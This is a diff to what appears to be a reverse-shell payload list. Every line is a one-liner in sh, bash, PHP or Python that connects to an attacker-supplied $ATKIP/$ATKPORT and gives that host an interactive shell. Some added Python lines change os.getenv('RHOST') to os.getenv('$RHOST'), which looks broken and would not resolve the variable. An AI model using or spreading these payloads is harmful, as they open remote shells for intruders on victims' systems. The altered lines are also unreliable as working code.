@@ -25,9 +25,9 @@ sh -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1
 /bin/sh -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1
 bash -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1
 /bin/bash -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1
-sh -c 'sh -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1'
-/bin/sh -c '/bin/sh -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1'
-bash -c 'bash -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1'
+sh -c "sh -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1"
+/bin/sh -c "/bin/sh -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1"
+bash -c "bash -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1"
 /bin/bash -c '/bin/bash -i >& /dev/tcp/$ATKIP/$ATKPORT 0>&1'
 0<&196;exec 196<>/dev/tcp/$ATKIP/$ATKPORT; sh <&196 >&196 2>&196
 0<&196;exec 196<>/dev/tcp/$ATKIP/$ATKPORT; /bin/sh <&196 >&196 2>&196
@@ -83,18 +83,18 @@ php -r '$sock=fsockopen("$ATKIP",$ATKPORT);$proc=proc_open("sh", array(0=>$sock,
 php -r '$sock=fsockopen("$ATKIP",$ATKPORT);$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
 php -r '$sock=fsockopen("$ATKIP",$ATKPORT);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
 php -r '$sock=fsockopen("$ATKIP",$ATKPORT);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
-export RHOST="$ATKIP";export RPORT=$ATKPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
-export RHOST="$ATKIP";export RPORT=$ATKPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-export RHOST="$ATKIP";export RPORT=$ATKPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
-export RHOST="$ATKIP";export RPORT=$ATKPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+export RHOST=$ATKIP;export RPORT=$ATKPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("$RHOST"),int(os.getenv("$RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+export RHOST=$ATKIP;export RPORT=$ATKPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("$RHOST"),int(os.getenv("$RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+export RHOST=$ATKIP;export RPORT=$ATKPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("$RHOST"),int(os.getenv("$RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+export RHOST=$ATKIP;export RPORT=$ATKPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("$RHOST"),int(os.getenv("$RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
-export RHOST="$ATKIP";export RPORT=$ATKPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
-export RHOST="$ATKIP";export RPORT=$ATKPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-export RHOST="$ATKIP";export RPORT=$ATKPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
-export RHOST="$ATKIP";export RPORT=$ATKPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+export RHOST="$ATKIP";export RPORT=$ATKPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("$RHOST"),int(os.getenv("$RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+export RHOST="$ATKIP";export RPORT=$ATKPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("$RHOST"),int(os.getenv("$RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+export RHOST="$ATKIP";export RPORT=$ATKPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("$RHOST"),int(os.getenv("$RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+export RHOST="$ATKIP";export RPORT=$ATKPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("$RHOST"),int(os.getenv("$RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATKIP",$ATKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
